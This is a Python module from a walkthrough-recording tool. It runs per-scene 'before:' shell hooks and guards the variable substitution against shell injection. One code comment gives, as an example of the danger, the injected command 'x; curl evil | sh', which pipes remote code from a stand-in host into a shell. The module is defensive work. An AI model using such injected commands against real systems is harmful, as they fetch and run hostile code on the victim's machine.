"""Per-scene ``before:`` hooks — change the world between two scenes, off camera.

A state-mutating narrative often needs something to happen BETWEEN beats that no
on-screen action can do: a supplier answers the buyer's question (an agent's MCP
write), a nightly job runs, a second seat acts. The recorder only had the
per-render ``setup:`` command, which runs before the browser opens — so the
first live v1 run (connect-labs supply-sophie-rutf) had its setup
spawn a detached watcher that fired the write when ``snapshots/scene_4.png``
appeared, padded scene 4 with three seconds of cursor motion to cover the race,
and could not preflight anything after scene 4.

A scene may now declare::

    - title: "A supplier answers, and the quote joins the ranking"
      before:
        command: python3 scripts/walkthroughs/demo/answer.py --tender ${round2_tender_id}
        timeout_seconds: 120

(or the shorthand ``before: "<command>"``). The recorder runs the command after
the previous scene's capture and before this scene's persona swap and nav,
synchronously, with ``${var}`` resolved against the LIVE variable map (setup
outputs plus anything captured on camera so far). It runs from the same cwd as
``setup.command`` (the git toplevel holding the spec). A non-zero exit or a
timeout aborts the render: the world is not in the state the next scene films.

The hook's wall time is recorded as a load-wait span, so the explainer excises
the pause from the film like any other loading wait. ``recipe_preflight`` runs
the same hook at the same point of its walk, so scenes after a hook are
preflighted against the world the render will see.

Ids a hook mints are not bound as variables — capture them on camera with a
``capture`` action, which is what keeps them visible in the run report.
"""
from __future__ import annotations

import re
import subprocess
import time
from pathlib import Path
from typing import Any, Callable

DEFAULT_TIMEOUT_SECONDS = 300


class SceneHookError(RuntimeError):
    """A scene's ``before:`` hook failed, so the scene cannot be filmed."""


def normalize_hook(hook: Any) -> dict | None:
    """``before:`` as ``{"command": str, "timeout_seconds": int}`` or ``None``."""
    if hook is None or hook == "":
        return None
    if isinstance(hook, str):
        hook = {"command": hook}
    elif hasattr(hook, "model_dump"):
        hook = hook.model_dump()
    if not isinstance(hook, dict):
        raise SceneHookError(f"`before:` must be a command string or a mapping, got {type(hook).__name__}")
    command = str(hook.get("command") or "").strip()
    if not command:
        raise SceneHookError("`before:` has no command")
    try:
        timeout = int(hook.get("timeout_seconds") or DEFAULT_TIMEOUT_SECONDS)
    except (TypeError, ValueError):
        raise SceneHookError(f"`before.timeout_seconds` must be an integer, got {hook.get('timeout_seconds')!r}")
    return {"command": command, "timeout_seconds": timeout}


# A `${var}` in a hook command is substituted raw into a `shell=True` string, and `capture`
# actions fill variables with text read off the app under test, which its users may have typed.
# A value is only substituted if it is a plain token (ids, slugs, urls, numbers); anything with a
# shell metacharacter or whitespace fails the hook instead of running `x; curl evil | sh`.
_HOOK_VAR_RE = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}")
_SAFE_HOOK_VALUE = re.compile(r"[A-Za-z0-9._:/@%+=,~-]*")


def _refuse_unsafe_values(command: str, variables: dict, scene_index) -> None:
    for name in _HOOK_VAR_RE.findall(command):
        if name in variables and not _SAFE_HOOK_VALUE.fullmatch(str(variables[name])):
            raise SceneHookError(
                f"scene {scene_index} `before:` would substitute ${{{name}}} = "
                f"{str(variables[name])[:60]!r} into a shell command; only plain tokens "
                "(letters, digits, . _ : / @ % + = , ~ -) are substituted into hooks"
            )


def run_scene_hook(
    hook: Any,
    *,
    scene_index: int | None,
    variables: dict[str, Any] | None = None,
    cwd: str | Path | None = None,
    resolve: Callable[[str, dict], str] | None = None,
    runner: Callable[..., Any] = subprocess.run,
) -> dict | None:
    """Run a scene's ``before:`` hook. Returns its provenance, or ``None`` if absent.

    Raises :class:`SceneHookError` on a non-zero exit, a timeout, or a command
    that still carries an unresolved ``${var}`` (running it would act on the
    literal placeholder).
    """
    spec = normalize_hook(hook)
    if spec is None:
        return None
    command = spec["command"]
    if resolve is not None:
        _refuse_unsafe_values(command, variables or {}, scene_index)
        command = resolve(command, dict(variables or {}))
    if "${" in command:
        raise SceneHookError(
            f"scene {scene_index} `before:` still has an unresolved ${{var}}: {command!r}"
        )
    print(f"  · before-hook (scene {scene_index}): $ {command}", flush=True)
    started = time.monotonic()
    try:
        result = runner(
            command, shell=True, cwd=str(cwd) if cwd else None, timeout=spec["timeout_seconds"],
        )
    except subprocess.TimeoutExpired:
        raise SceneHookError(
            f"scene {scene_index} `before:` timed out after {spec['timeout_seconds']}s: {command}"
        )
    duration = round(time.monotonic() - started, 2)
    code = getattr(result, "returncode", 0)
    if code != 0:
        raise SceneHookError(
            f"scene {scene_index} `before:` failed (exit {code} after {duration:.0f}s): {command}\n"
            "The world is not in the state this scene films — refusing to continue."
        )
    return {
        "scene_index": scene_index,
        "command": command,
        "exit_code": code,
        "duration_seconds": duration,
    }


__all__ = ["SceneHookError", "normalize_hook", "run_scene_hook"]
